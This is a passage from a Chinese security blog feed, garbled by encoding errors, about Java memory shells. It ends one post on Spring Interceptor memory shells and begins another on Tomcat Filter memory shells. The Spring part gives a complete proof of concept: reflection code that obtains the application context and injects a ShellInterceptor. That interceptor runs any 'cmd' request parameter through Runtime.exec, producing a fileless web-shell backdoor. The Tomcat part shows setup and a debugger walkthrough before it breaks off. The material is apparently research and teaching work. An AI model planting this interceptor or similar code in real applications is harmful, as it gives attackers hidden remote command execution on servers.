applyPreHandle éå†æ‰§è¡Œäº†æ‹¦æˆªå™¨ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518383.png" alt="img"></p><p> å…¶ä»–å¸ˆå‚…ç»™å‡ºäº† Filter,controller,Interceptorsæ‰§è¡Œçš„é¡ºåºï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518441.png" alt="img"></p><ul><li>preHandle( )ï¼šè¯¥æ–¹æ³•åœ¨æ§åˆ¶å™¨çš„å¤„ç†è¯·æ±‚æ–¹æ³•å‰æ‰§è¡Œï¼Œå…¶è¿”å›å€¼è¡¨ç¤ºæ˜¯å¦ä¸­æ–­åç»­æ“ä½œï¼Œè¿”å› true è¡¨ç¤ºç»§ç»­å‘ä¸‹æ‰§è¡Œï¼Œè¿”å› false è¡¨ç¤ºä¸­æ–­åç»­æ“ä½œã€‚</li><li>postHandle( )ï¼šè¯¥æ–¹æ³•åœ¨æ§åˆ¶å™¨çš„å¤„ç†è¯·æ±‚æ–¹æ³•è°ƒç”¨ä¹‹åã€è§£æè§†å›¾ä¹‹å‰æ‰§è¡Œï¼Œå¯ä»¥é€šè¿‡æ­¤æ–¹æ³•å¯¹è¯·æ±‚åŸŸä¸­çš„æ¨¡å‹å’Œè§†å›¾åšè¿›ä¸€æ­¥çš„ä¿®æ”¹ã€‚</li><li>afterCompletion( )ï¼šè¯¥æ–¹æ³•åœ¨æ§åˆ¶å™¨çš„å¤„ç†è¯·æ±‚æ–¹æ³•æ‰§è¡Œå®Œæˆåæ‰§è¡Œï¼Œå³è§†å›¾æ¸²æŸ“ç»“æŸåæ‰§è¡Œï¼Œå¯ä»¥é€šè¿‡æ­¤æ–¹æ³•å®ç°ä¸€äº›èµ„æºæ¸…ç†ã€è®°å½•æ—¥å¿—ä¿¡æ¯ç­‰å·¥ä½œã€‚</li></ul><h3 id="2-3-æ³¨å†Œ-Interceptor"><a href="#2-3-æ³¨å†Œ-Interceptor" class="headerlink" title="2.3 æ³¨å†Œ Interceptor"></a>2.3 æ³¨å†Œ Interceptor</h3><h4 id="2-3-1-è·å–ä¸Šä¸‹æ–‡"><a href="#2-3-1-è·å–ä¸Šä¸‹æ–‡" class="headerlink" title="2.3.1 è·å–ä¸Šä¸‹æ–‡"></a>2.3.1 è·å–ä¸Šä¸‹æ–‡</h4><p>å‚è€ƒ Controller çš„è·å–ä¸Šä¸‹æ–‡æ–¹å¼</p><p>è¿™é‡Œä½¿ç”¨åå°„è·å–</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 1. åå°„ org.springframework.context.support.LiveBeansView ç±» applicationContexts å±æ€§</span><br>java.lang.reflect.<span class="hljs-type">Field</span> <span class="hljs-variable">filed</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.springframework.context.support.LiveBeansView&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;applicationContexts&quot;</span>);<br><span class="hljs-comment">// 2. å±æ€§è¢« private ä¿®é¥°ï¼Œæ‰€ä»¥ setAccessible true</span><br>filed.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-comment">// 3. è·å–ä¸€ä¸ª ApplicationContext å®ä¾‹</span><br>org.springframework.web.context.<span class="hljs-type">WebApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span>(org.springframework.web.context.WebApplicationContext) ((java.util.LinkedHashSet)filed.get(<span class="hljs-literal">null</span>)).iterator().next();<br></code></pre></td></tr></table></figure><h4 id="2-3-2-è·å–adaptedInterceptorså±æ€§å€¼"><a href="#2-3-2-è·å–adaptedInterceptorså±æ€§å€¼" class="headerlink" title="2.3.2 è·å–adaptedInterceptorså±æ€§å€¼"></a>2.3.2 è·å–adaptedInterceptorså±æ€§å€¼</h4><p> è·å¾— <code>ApplicationContext</code> å®ä¾‹åï¼Œè¿˜éœ€è¦çŸ¥é“ <code>org.springframework.web.servlet.handler.AbstractHandlerMapping</code> ç±»å®ä¾‹çš„ bean name å«ä»€ä¹ˆã€‚  </p><p> æˆ‘ä»¬å¯ä»¥é€šè¿‡<code>ApplicationContext</code>ä¸Šä¸‹æ–‡æ¥è·å–<code>AbstractHandlerMapping</code>ï¼Œè¿›è€Œåå°„è·å–<code>adaptedInterceptors</code>å±æ€§å€¼  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">org.springframework.web.servlet.handler.<span class="hljs-type">AbstractHandlerMapping</span> <span class="hljs-variable">abstractHandlerMapping</span> <span class="hljs-operator">=</span> (org.springframework.web.servlet.handler.AbstractHandlerMapping)context.getBean(<span class="hljs-string">&quot;requestMappingHandlerMapping&quot;</span>);<br>java.lang.reflect.<span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField(<span class="hljs-string">&quot;adaptedInterceptors&quot;</span>);<br>field.setAccessible(<span class="hljs-literal">true</span>);<br>java.util.ArrayList&lt;Object&gt; adaptedInterceptors = (java.util.ArrayList&lt;Object&gt;)field.get(abstractHandlerMapping);<br></code></pre></td></tr></table></figure><h4 id="2-3-3-æ¶æ„-Interceptor"><a href="#2-3-3-æ¶æ„-Interceptor" class="headerlink" title="2.3.3 æ¶æ„ Interceptor"></a>2.3.3 æ¶æ„ Interceptor</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.shell.interceptor;<br> <br><span class="hljs-keyword">import</span> org.springframework.web.servlet.HandlerInterceptor;<br> <br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.IOException;<br> <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ShellInterceptor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HandlerInterceptor</span> &#123;<br> <br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">preHandle</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>        <span class="hljs-keyword">if</span> (cmd != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                Runtime.getRuntime().exec(cmd);<br>            &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                e.printStackTrace();<br>            &#125; <span class="hljs-keyword">catch</span> (NullPointerException n) &#123;<br>                n.printStackTrace();<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="2-3-4-åŠ¨æ€æ³¨å†ŒInterceptor"><a href="#2-3-4-åŠ¨æ€æ³¨å†ŒInterceptor" class="headerlink" title="2.3.4 åŠ¨æ€æ³¨å†ŒInterceptor"></a>2.3.4 åŠ¨æ€æ³¨å†ŒInterceptor</h4><p>æˆ‘ä»¬çŸ¥é“Springæ˜¯é€šè¿‡éå†adaptedInterceptorså±æ€§å€¼æ¥æ‰§è¡ŒInterceptorçš„ï¼Œå› æ­¤æœ€åæˆ‘ä»¬åªéœ€è¦å°†æ¶æ„InterceptoråŠ å…¥åˆ° <code>adaptedInterceptors</code> å±æ€§å€¼ä¸­å°±å¯ä»¥äº†ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//å°†æ¶æ„Interceptoræ·»åŠ å…¥adaptedInterceptors</span><br><span class="hljs-type">ShellInterceptor</span> <span class="hljs-variable">shell_interceptor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ShellInterceptor</span>();<br>adaptedInterceptors.add(shell_interceptor);<br></code></pre></td></tr></table></figure><h4 id="2-3-5-å®Œæ•´-POC"><a href="#2-3-5-å®Œæ•´-POC" class="headerlink" title="2.3.5 å®Œæ•´ POC"></a>2.3.5 å®Œæ•´ POC</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.src.springmem.demos.controller;<br><br><br><span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.HandlerInterceptor;<br><br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">shell_interceptor_controller</span> &#123;<br><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-meta">@RequestMapping(&quot;/inject&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Inject</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//è·å–ä¸Šä¸‹æ–‡ç¯å¢ƒ</span><br>        java.lang.reflect.<span class="hljs-type">Field</span> <span class="hljs-variable">filed</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.springframework.context.support.LiveBeansView&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;applicationContexts&quot;</span>);<br>        filed.setAccessible(<span class="hljs-literal">true</span>);<br>        org.springframework.web.context.<span class="hljs-type">WebApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (org.springframework.web.context.WebApplicationContext) ((java.util.LinkedHashSet) filed.get(<span class="hljs-literal">null</span>)).iterator().next();<br><br>        <span class="hljs-comment">//è·å–adaptedInterceptorså±æ€§å€¼</span><br>        org.springframework.web.servlet.handler.<span class="hljs-type">AbstractHandlerMapping</span> <span class="hljs-variable">abstractHandlerMapping</span> <span class="hljs-operator">=</span> (org.springframework.web.servlet.handler.AbstractHandlerMapping) context.getBean(<span class="hljs-string">&quot;requestMappingHandlerMapping&quot;</span>);<br>        java.lang.reflect.<span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField(<span class="hljs-string">&quot;adaptedInterceptors&quot;</span>);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        java.util.ArrayList&lt;Object&gt; adaptedInterceptors = (java.util.ArrayList&lt;Object&gt;) field.get(abstractHandlerMapping);<br><br>        <span class="hljs-comment">//å°†æ¶æ„ Interceptoræ·»åŠ å…¥ adaptedInterceptors</span><br>        <span class="hljs-type">ShellInterceptor</span> <span class="hljs-variable">shellInterceptor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ShellInterceptor</span>();<br>        adaptedInterceptors.add(shellInterceptor);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ShellInterceptor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HandlerInterceptor</span> &#123;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">preHandle</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>            <span class="hljs-keyword">if</span> (cmd != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    Runtime.getRuntime().exec(cmd);<br>                &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                    e.printStackTrace();<br>                &#125; <span class="hljs-keyword">catch</span> (NullPointerException n) &#123;<br>                    n.printStackTrace();<br>                &#125;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518658.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518094.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081521076.png" alt="img"></p><h1 id="å‚è€ƒï¼š"><a href="#å‚è€ƒï¼š" class="headerlink" title="å‚è€ƒï¼š"></a>å‚è€ƒï¼š</h1><p><a href="https://www.cnblogs.com/rebeyond/p/9686213.html">ã€åŸåˆ›ã€‘åˆ©ç”¨â€œè¿›ç¨‹æ³¨å…¥â€å®ç°æ— æ–‡ä»¶ä¸æ­»webshell</a></p><p><a href="https://goodapple.top/archives/1355">Javaå®‰å…¨å­¦ä¹ â€”â€”å†…å­˜é©¬ - æ«ã®Blog</a></p><p><a href="http://101.36.122.13:4000/2025/08/06/Spring%E5%86%85%E5%AD%98%E9%A9%AC/#J9TFY">Springå†…å­˜é©¬ | CurlySeanâ€™s Blog</a></p><p><a href="https://y4er.com/posts/javaagent-tomcat-memshell/#%E7%AE%80%E8%BF%B0%E5%86%85%E5%AD%98shell">Java Agentå®ç°ååºåˆ—åŒ–æ³¨å…¥å†…å­˜shell</a></p><p><a href="https://su18.org/post/memory-shell/">JavaWeb å†…å­˜é©¬ä¸€å‘¨ç›®é€šå…³æ”»ç•¥ | ç´ åå…«</a></p><p><a href="https://su18.org/post/memory-shell-2/">JavaWeb å†…å­˜é©¬äºŒå‘¨ç›®é€šå…³æ”»ç•¥ | ç´ åå…«</a></p><p><a href="https://www.4hou.com/posts/zlkq">Shellä¸­çš„å¹½çµç‹è€…â€”JAVAWEB å†…å­˜é©¬ ã€è®¤çŸ¥ç¯‡ã€‘ - å˜¶å¼ RoarTalk â€“ ç½‘ç»œå®‰å…¨è¡Œä¸šç»¼åˆæœåŠ¡å¹³å°,4hou.com</a></p><p><a href="https://www.freebuf.com/articles/web/433972.html">Javaå†…å­˜é©¬â€”â€”Tomcat Valveå‹çš„ä¸‰ç§æ³¨å…¥ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a></p><p><a href="https://hilang.cloud/java-%E5%86%85%E5%AD%98%E9%A9%AC%EF%BC%88%E5%9B%9B%EF%BC%89%EF%BC%9Aspring-boot-controller-%E5%86%85%E5%AD%98%E9%A9%AC/">Java å†…å­˜é©¬ï¼ˆå››ï¼‰ï¼šSpring Boot Controller å†…å­˜é©¬ | æ¸æ€€çš„åšå®¢</a></p><p><a href="https://stoocea.github.io/post/Spring%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90.html#2-Controller-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC">Springå‹å†…å­˜é©¬åˆ†æ</a></p><p><a href="https://www.runoob.com/servlet/servlet-intro.html">Servlet ç®€ä»‹ | èœé¸Ÿæ•™ç¨‹</a></p><p><a href="https://clowsman.github.io/2024/11/13/Spring%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/index.html">Springå†…å­˜é©¬å­¦ä¹ </a></p><p><a href="https://xz.aliyun.com/news/11493">Springå†…å­˜é©¬â€”â€”Controller&#x2F;Interceptoræ„é€ </a></p><p>[åŸºç¡€ç¯‡ - Javassist ä½¿ç”¨æŒ‡å—](<a href="https://changeyourway.github.io/2024/06/07/Java">https://changeyourway.github.io/2024/06/07/Java</a> å®‰å…¨&#x2F;åŸºç¡€ç¯‡-javassistç”¨æ³•æŒ‡å—&#x2F;)</p><p><a href="https://goodapple.top/archives/1145#header-id-20">Javaå®‰å…¨å­¦ä¹ â€”â€”ROMEååºåˆ—åŒ– - æ«ã®Blog</a> ï¼ˆä½¿ç”¨Javassistç¼©çŸ­æ¶æ„classï¼‰</p><p><a href="https://y4er.com/posts/javaagent-tomcat-memshell/">Java Agentå®ç°ååºåˆ—åŒ–æ³¨å…¥å†…å­˜shell</a></p><p><a href="http://101.36.122.13:4000/2025/08/05/JavaAgent%E5%86%85%E5%AD%98%E9%A9%AC">Agentå†…å­˜é©¬ | CurlySeanâ€™s Blog</a></p>]]></content>
    
    
    <categories>
      
      <category>Javaå®‰å…¨</category>
      
    </categories>
    
    
    <tags>
      
      <tag>javaå®‰å…¨</tag>
      
      <tag>å†…å­˜é©¬</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java å†…å­˜é©¬ç¬¬äºŒç¯‡ - Tomcat å†…å­˜é©¬</title>
    <link href="/2025/11/08/Java%20%E5%86%85%E5%AD%98%E9%A9%AC%E7%AC%AC%E4%BA%8C%E7%AF%87%20-%20Tomcat%20%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    <url>/2025/11/08/Java%20%E5%86%85%E5%AD%98%E9%A9%AC%E7%AC%AC%E4%BA%8C%E7%AF%87%20-%20Tomcat%20%E5%86%85%E5%AD%98%E9%A9%AC/</url>
    
    <content type="html"><![CDATA[<h1 id="Java-å†…å­˜é©¬ç¬¬äºŒç¯‡-Tomcat-å†…å­˜é©¬"><a href="#Java-å†…å­˜é©¬ç¬¬äºŒç¯‡-Tomcat-å†…å­˜é©¬" class="headerlink" title="Java å†…å­˜é©¬ç¬¬äºŒç¯‡ - Tomcat å†…å­˜é©¬"></a>Java å†…å­˜é©¬ç¬¬äºŒç¯‡ - Tomcat å†…å­˜é©¬</h1><h1 id="äºŒã€Tomcat-å†…å­˜é©¬"><a href="#äºŒã€Tomcat-å†…å­˜é©¬" class="headerlink" title="äºŒã€Tomcat å†…å­˜é©¬"></a>äºŒã€Tomcat å†…å­˜é©¬</h1><h2 id="1-Filter-å†…å­˜é©¬"><a href="#1-Filter-å†…å­˜é©¬" class="headerlink" title="1. Filter å†…å­˜é©¬"></a>1. Filter å†…å­˜é©¬</h2><p>Filter æˆ‘ä»¬ç§°ä¹‹ä¸ºè¿‡æ»¤å™¨ï¼Œæ˜¯ Java ä¸­æœ€å¸¸è§ä¹Ÿæœ€å®ç”¨çš„æŠ€æœ¯ä¹‹ä¸€ï¼Œé€šå¸¸è¢«ç”¨æ¥å¤„ç†é™æ€ web èµ„æºã€è®¿é—®æƒé™æ§åˆ¶ã€è®°å½•æ—¥å¿—ç­‰é™„åŠ åŠŸèƒ½ç­‰ç­‰ã€‚ä¸€æ¬¡è¯·æ±‚è¿›å…¥åˆ°æœåŠ¡å™¨åï¼Œå°†å…ˆç”± Filter å¯¹ç”¨æˆ·è¯·æ±‚è¿›è¡Œé¢„å¤„ç†ï¼Œå†äº¤ç»™ Servletã€‚</p><p>é€šå¸¸æƒ…å†µä¸‹ï¼ŒFilter é…ç½®åœ¨é…ç½®æ–‡ä»¶å’Œæ³¨è§£ä¸­ï¼Œåœ¨å…¶ä»–ä»£ç ä¸­å¦‚æœæƒ³è¦å®Œæˆæ³¨å†Œï¼Œä¸»è¦æœ‰ä»¥ä¸‹å‡ ç§æ–¹å¼ï¼š</p><ol><li>ä½¿ç”¨ ServletContext çš„ addFilter&#x2F;createFilter æ–¹æ³•æ³¨å†Œï¼›</li><li>ä½¿ç”¨ ServletContextListener çš„ contextInitialized æ–¹æ³•åœ¨æœåŠ¡å™¨å¯åŠ¨æ—¶æ³¨å†Œï¼ˆå°†ä¼šåœ¨ Listener ä¸­è¿›è¡Œæè¿°ï¼‰ï¼›</li><li>ä½¿ç”¨ ServletContainerInitializer çš„ onStartup æ–¹æ³•åœ¨åˆå§‹åŒ–æ—¶æ³¨å†Œï¼ˆéåŠ¨æ€ï¼Œåé¢ä¼šæè¿°ï¼‰ã€‚</li></ol><h3 id="1-1-ç¯å¢ƒåˆ›å»º"><a href="#1-1-ç¯å¢ƒåˆ›å»º" class="headerlink" title="1.1 ç¯å¢ƒåˆ›å»º"></a>1.1 ç¯å¢ƒåˆ›å»º</h3><p>web.xml:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">filter</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>FilterTest<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">filter-class</span>&gt;</span>com.src.tomcatdemo.FilterTest<span class="hljs-tag">&lt;/<span class="hljs-name">filter-class</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">filter</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">filter-mapping</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>FilterTest<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/filter<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">filter-mapping</span>&gt;</span><br></code></pre></td></tr></table></figure><p>è‡ªå®šä¹‰ä¸€ä¸ª Filter:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.src.tomcatdemo;<br><br><span class="hljs-keyword">import</span> javax.servlet.*;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FilterTest</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Filter</span> &#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(FilterConfig filterConfig)</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br>        System.out.println(<span class="hljs-string">&quot;Filter launch&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>        System.out.println(<span class="hljs-string">&quot;The filtering operation was performed\n&quot;</span>);<br>        filterChain.doFilter(servletRequest, servletResponse);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081514652.png" alt="img"></p><h3 id="1-2-æµç¨‹åˆ†æ"><a href="#1-2-æµç¨‹åˆ†æ" class="headerlink" title="1.2 æµç¨‹åˆ†æ"></a>1.2 æµç¨‹åˆ†æ</h3><h4 id="åœ¨è®¿é—®-filter-ä¹‹åçš„æµç¨‹åˆ†æ"><a href="#åœ¨è®¿é—®-filter-ä¹‹åçš„æµç¨‹åˆ†æ" class="headerlink" title="åœ¨è®¿é—® &#x2F;filter ä¹‹åçš„æµç¨‹åˆ†æ"></a>åœ¨è®¿é—® &#x2F;filter ä¹‹åçš„æµç¨‹åˆ†æ</h4><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vbscript">filterChain.<span class="hljs-keyword">do</span><span class="hljs-built_in">Filter</span>(servletRequest, servletResponse);<br></code></pre></td></tr></table></figure><p>æ–­ç‚¹è°ƒè¯•</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081514811.png" alt="img"></p><p>ApplicationFilterChain.dofilter</p><p><strong>å®‰å…¨æ£€æŸ¥</strong>ï¼šå¦‚æœå¯ç”¨äº†å®‰å…¨ç®¡ç†å™¨(<code>Globals.IS_SECURITY_ENABLED</code>)ï¼Œåˆ™åœ¨ç‰¹æƒä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œ</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081514397.png" alt="img"></p><p><strong>æ‰§è¡Œ</strong>ï¼šå®é™…è¿‡æ»¤é€»è¾‘åœ¨<code>internalDoFilter</code>æ–¹æ³•ä¸­å®Œæˆ</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081514231.png" alt="img"></p><p>æ­¤æ—¶çš„ filter ä¸­æœ‰ä¿©ä¸ªå€¼ï¼š</p><p>0 æ˜¯æˆ‘ä»¬è‡ªå®šä¹‰çš„ FilterTest</p><p>1 æ˜¯ tomcat è‡ªå¸¦çš„</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081513150.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081514013.png" alt="img"></p><p>è°ƒç”¨äº†<code>filter.doFilter()</code>ï¼Œè€Œ<code>filter</code>æ˜¯é€šè¿‡<code>filterConfig.getFilter()</code>å¾—åˆ°çš„ï¼Œ<code>filterConfig</code>å®šä¹‰å¦‚ä¸‹</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081514958.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081532696.png" alt="img"></p><h5 id="æ€»çš„æ¥è¯´ï¼š"><a href="#æ€»çš„æ¥è¯´ï¼š" class="headerlink" title="æ€»çš„æ¥è¯´ï¼š"></a>æ€»çš„æ¥è¯´ï¼š</h5><p>æœ€åä¸€ä¸ª filter è°ƒç”¨ servlet çš„ service æ–¹æ³•</p><p>ä¸Šä¸€ä¸ª Filter.doFilter() æ–¹æ³•ä¸­è°ƒç”¨ FilterChain.doFilter() æ–¹æ³•å°†è°ƒç”¨ä¸‹ä¸€ä¸ª Filter.doFilter() æ–¹æ³•ï¼›</p><p>æœ€åä¸€ä¸ª Filter.doFilter() æ–¹æ³•ä¸­è°ƒç”¨çš„ FilterChain.doFilter() æ–¹æ³•å°†è°ƒç”¨ç›®æ ‡ Servlet.service() 